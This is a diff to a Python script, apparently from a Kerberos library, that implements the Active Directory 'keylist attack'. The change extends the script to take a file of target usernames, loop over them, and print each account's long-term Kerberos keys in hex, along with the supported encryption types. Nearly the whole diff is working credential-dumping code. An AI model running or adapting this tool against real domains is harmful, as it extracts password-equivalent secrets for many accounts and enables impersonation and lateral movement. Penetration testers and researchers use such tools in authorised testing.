@@ -17,43 +17,77 @@ Example:
     python keylist.py 'kerberos+aes://test.corp\\krbtgt_1234:921a7fece11f4d8c72432e41e40d0372921a7fece11f4d8c72432e41e40d0372@10.10.10.2' victimuser
 """
 
+import enum
+
+# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919
+class SupportedEtypes(enum.IntFlag):
+	DES_CBC_CRC = 1
+	DES_CBC_MD5 = 2
+	ARCFOUR_HMAC_MD5 = 4
+	AES128_CTS_HMAC_SHA1_96 = 8
+	AES256_CTS_HMAC_SHA1_96 = 16
+	AES256_CTS_HMAC_SHA1_96_SK = 32
+	FAST = 0x20000
+	COMPOUND_IDENTITY =0x40000
+	CLAIM_TOKEN = 0x80000
+	Resource_SID_compression_disabled = 0x100000
+	
+
+
 async def keylistattack(kerberos_url:str, targetuser:str = None, targetrealm:str = None):
-	cu = KerberosClientFactory.from_url(kerberos_url)
-	client = cu.get_client()
 	logging.debug('Performing keylist attack')
+
+	targetusers = []
+	try:
+		with open(targetuser, 'r') as f:
+			targetusers = f.read().splitlines()
+	except Exception as e:
+		targetusers.append(targetuser)
 	
-	tgs, encTGSRepPart, key = await client.keylist(targetuser, targetrealm=targetrealm)
-	#kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
-	#print(str(kirbi))
+	for targetuser in targetusers:
+		try:
+			cu = KerberosClientFactory.from_url(kerberos_url)
+			client = cu.get_client()
+			tgs, encTGSRepPart, key = await client.keylist(targetuser, targetrealm=targetrealm)
+		except Exception as e:
+			print(f'[ERR] {targetuser}: {e}')
+			continue
+		#kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
+		#print(str(kirbi))
 
-	keys = {}
-	if 'encrypted-pa-data' in encTGSRepPart and encTGSRepPart['encrypted-pa-data'] is not None:
-		for encpadata in encTGSRepPart['encrypted-pa-data']:
-			if encpadata['padata-type'] == 162:
-				keylist = KERB_KEY_LIST_REP.load(encpadata['padata-value'])
-				for key in keylist.native:
-					if key['keytype'] not in keys:
-						keys[key['keytype']] = []
-					keys[key['keytype']].append(key['keyvalue'])
-	
-	if len(keys) == 0:
-		print('No keys returned from the server')
-		return
+		print(encTGSRepPart)
 
-	cred = tgs
-	username = cred.get('cname')
-	if username is not None:
-		if len(username['name-string']) > 1:
-			username = '\\'.join(username['name-string'])
-		else:
-			userrealm = cred.get('crealm')
-			username = '%s\\%s' % (userrealm, username['name-string'][0])
+		keys = {}
+		if 'encrypted-pa-data' in encTGSRepPart and encTGSRepPart['encrypted-pa-data'] is not None:
+			for encpadata in encTGSRepPart['encrypted-pa-data']:
+				if encpadata['padata-type'] == 162:
+					keylist = KERB_KEY_LIST_REP.load(encpadata['padata-value'])
+					for key in keylist.native:
+						if key['keytype'] not in keys:
+							keys[key['keytype']] = []
+						keys[key['keytype']].append(key['keyvalue'])
+				elif encpadata['padata-type'] == 165:
+					supported_etypes = int.from_bytes(encpadata['padata-value'], 'little', signed=False)
+					print(SupportedEtypes(supported_etypes).name)
+		
+		if len(keys) == 0:
+			print(f'[ERR] {targetuser}: No keys returned from the server')
+			continue
+
+		cred = tgs
+		username = cred.get('cname')
+		if username is not None:
+			if len(username['name-string']) > 1:
+				username = '\\'.join(username['name-string'])
+			else:
+				userrealm = cred.get('crealm')
+				username = '%s\\%s' % (userrealm, username['name-string'][0])
 
 
-	for keytype in keys:
-		for keyvalue in keys[keytype]:
-			print('[%s] %s: %s' % (keytype, username, keyvalue.hex()))
-		print('')
+		for keytype in keys:
+			for keyvalue in keys[keytype]:
+				print('[%s] %s: %s' % (keytype, username, keyvalue.hex()))
+			print('')
 
 def main():
 	import argparse
